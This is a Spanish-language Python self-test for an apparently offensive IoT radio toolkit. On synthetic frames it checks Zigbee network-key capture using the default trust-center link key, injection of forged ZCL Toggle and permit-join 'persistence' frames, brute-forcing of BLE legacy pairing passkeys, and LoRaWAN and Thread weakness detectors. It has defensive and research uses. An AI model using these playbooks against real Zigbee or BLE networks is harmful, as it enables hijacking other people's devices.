"""Self-test criptográfico de los playbooks — round-trip sin hardware.

1. Construye un Transport Key sintético (idéntico al de un hub real).
2. El watcher lo intercepta y recupera la network key con la TC link key default.
3. Verifica que NO hay falsos positivos con tráfico basura.
4. Construye un comando ZCL inyectado y verifica que su MIC descifra con la
   network key robada (lo que haría el dispositivo víctima al recibirlo).
5. Ídem para el frame ZDO de apertura de red (persistencia).
6. BLE legacy: c1/s1 contra los vectores OFICIALES de la Core Spec + crack
   round-trip de un pairing sintético con passkey conocido.
7. LoRaWAN: FCnt reset (replay-vulnerable) y DevNonce reutilizado.
8. Thread: 6LoWPAN/IPHC → MLE en claro y ventana de comisionado (UDP 5684).

Ejecutar:  python -m skyrf.playbooks.selftest
"""

from __future__ import annotations

import os
import struct
import sys

from skyrf.playbooks.crypto_zigbee import DEFAULT_TC_LINK_KEY
from skyrf.playbooks.transport_key_watcher import (
    TransportKeyWatcher, build_synthetic_transport_key,
)
from skyrf.playbooks.zcl_injector import (
    build_zcl_frame, decrypt_injected_for_test,
)
from skyrf.playbooks.persistence import build_permit_join_frame


def main() -> int:
    print("SkyRF · selftest de playbooks\n")

    network_key = bytes.fromhex("00112233445566778899AABBCCDDEEFF")
    tc_addr = 0x00124B0001AA2201
    pan_id = 0x1A62
    ok_all = True

    # 1 — Transport Key round-trip
    frame = build_synthetic_transport_key(network_key, tc_addr, pan_id)
    print(f"[1] Transport Key sintético: {len(frame)} bytes")
    captured = []
    TransportKeyWatcher(on_key_captured=captured.append).feed(frame)
    if captured and captured[0].network_key == network_key:
        net = captured[0]
        print(f"    [✓] network key recuperada: {net.network_key.hex()}")
        print(f"        {net.summary()}")
    else:
        print("    [✗] el watcher NO recuperó la network key"); ok_all = False
        net = None

    # 2 — sin falsos positivos
    false_pos = []
    TransportKeyWatcher(on_key_captured=false_pos.append).feed(b"\x41\x88" + b"\x00" * 30)
    TransportKeyWatcher(on_key_captured=false_pos.append).feed(b"\xff" * 60)
    print(f"[2] [{'✓' if not false_pos else '✗'}] sin falsos positivos en tráfico basura")
    ok_all &= not false_pos

    if net:
        # 3 — inyección ZCL: el MIC debe verificar con la network key robada
        injected = build_zcl_frame(
            net.network_key, tc_long_addr=tc_addr, nwk_frame_counter=500,
            dst_pan=pan_id, short_dst=0x1234,
        )
        plain = decrypt_injected_for_test(injected, net.network_key)
        zcl_ok = plain is not None and plain[-1] == 0x02  # cmd toggle
        print(f"[3] [{'✓' if zcl_ok else '✗'}] frame ZCL inyectado: MIC verifica "
              f"y cmd=Toggle llega intacto ({len(injected)} bytes)")
        ok_all &= bool(zcl_ok)

        # 4 — persistencia: permit-join inyectado
        pj = build_permit_join_frame(
            net.network_key, tc_long_addr=tc_addr, nwk_frame_counter=501,
            dst_pan=pan_id, duration_s=60,
        )
        plain4 = decrypt_injected_for_test(pj, net.network_key)
        pj_ok = plain4 is not None and plain4[-2] == 60  # duration en el payload ZDO
        print(f"[4] [{'✓' if pj_ok else '✗'}] frame ZDO permit-join: MIC verifica "
              f"y duration=60s llega intacta ({len(pj)} bytes)")
        ok_all &= bool(pj_ok)

    # 5 — BLE legacy: vectores oficiales + crack round-trip
    from skyrf.playbooks import ble_legacy as BL
    vec_ok = BL.selftest_crypto()
    print(f"[5] [{'✓' if vec_ok else '✗'}] BLE c1/s1 contra los vectores "
          "oficiales de la Core Spec (Vol 3 Part H)")
    ok_all &= vec_ok

    # crack round-trip: pairing sintético con passkey conocido
    pw_real = 424242
    tk = pw_real.to_bytes(16, "big")
    preq = bytes([0x01, 0x03, 0x00, 0x00, 0x10, 0x00, 0x00])
    pres = bytes([0x02, 0x03, 0x00, 0x00, 0x10, 0x00, 0x00])
    ia, ra = os.urandom(6), os.urandom(6)
    rand_i, rand_r = os.urandom(16), os.urandom(16)
    conf_i = BL.c1(tk, rand_i[::-1], preq[::-1], pres[::-1], 1, 0,
                   ia[::-1], ra[::-1])[::-1]
    mat = BL.PairingMaterial(preq=preq, pres=pres, confirm_i=conf_i,
                             confirm_r=b"", rand_i=rand_i, rand_r=rand_r,
                             iat=1, rat=0, ia=ia, ra=ra)
    import io, contextlib
    with contextlib.redirect_stdout(io.StringIO()):   # silenciar el progreso
        pw_found, _tk_found = BL.crack_tk(mat, progress_every=0)
    crack_ok = pw_found == pw_real
    print(f"[6] [{'✓' if crack_ok else '✗'}] BLE crack round-trip: passkey "
          f"{pw_real} recuperado por fuerza bruta desde los confirms")
    ok_all &= crack_ok

    # 7 — LoRaWAN auditor
    from skyrf.playbooks.lorawan_auditor import LoRaWANAuditor
    lor = LoRaWANAuditor()
    alerts = []
    lor.on_alert = alerts.append
    dev = bytes.fromhex("01020304")
    def lorawan_data(fcnt):
        return bytes([0x80]) + dev + bytes([0x00]) + struct.pack("<H", fcnt) + \
               b"\x01" + b"\xaa" * 4 + b"\x00" * 4
    lor.feed(lorawan_data(10)); lor.feed(lorawan_data(11))
    lor.feed(lorawan_data(3))                          # reset → replay-vulnerable
    join = bytes([0x00]) + b"\x01" * 8 + b"\x02" * 8 + b"\x34\x12" + b"\x00" * 4
    lor.feed(join); lor.feed(join)                     # mismo DevNonce dos veces
    titles = {a["title"] for a in alerts}
    lor_ok = "FCNT RESET — REPLAY-VULNERABLE" in titles and \
             "DEVNONCE REUTILIZADO" in titles
    print(f"[7] [{'✓' if lor_ok else '✗'}] LoRaWAN: FCnt reset y DevNonce "
          f"reutilizado detectados ({len(alerts)} alertas)")
    ok_all &= lor_ok

    # 8 — Thread watcher: IPHC + NHC-UDP
    from skyrf.playbooks.thread_watcher import ThreadWatcher
    def thread_frame(dport, mle):
        mac = struct.pack("<HBHHH", 0x8841, 1, 0xCAFE, 0x1234, 0x5678)
        lowpan = bytes([0x7F, 0x33, 0xF0])            # IPHC + NHC-UDP full ports
        return mac + lowpan + struct.pack(">HH", 19788, dport) + b"\x00\x00" + mle
    tw = ThreadWatcher()
    alerts2 = []
    tw.on_alert = alerts2.append
    tw.feed(thread_frame(19788, bytes([0xFF, 0x07])))   # Data Request en claro
    tw.feed(thread_frame(5684, b"\x16\xfe\xfd"))         # DTLS handshake (comisionado)
    titles2 = {a["title"] for a in alerts2}
    tw_ok = "MLE SENSIBLE EN CLARO" in titles2 and \
            "VENTANA DE COMISIONADO ABIERTA" in titles2
    print(f"[8] [{'✓' if tw_ok else '✗'}] Thread: MLE en claro y ventana de "
          f"comisionado detectados ({len(alerts2)} alertas)")
    ok_all &= tw_ok

    print()
    if ok_all:
        print("Todos los playbooks verificados (round-trip criptográfico completo).")
        print(f"TC link key default: {DEFAULT_TC_LINK_KEY.hex()}")
        return 0
    print("SELFTEST FALLÓ — revisar salida.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
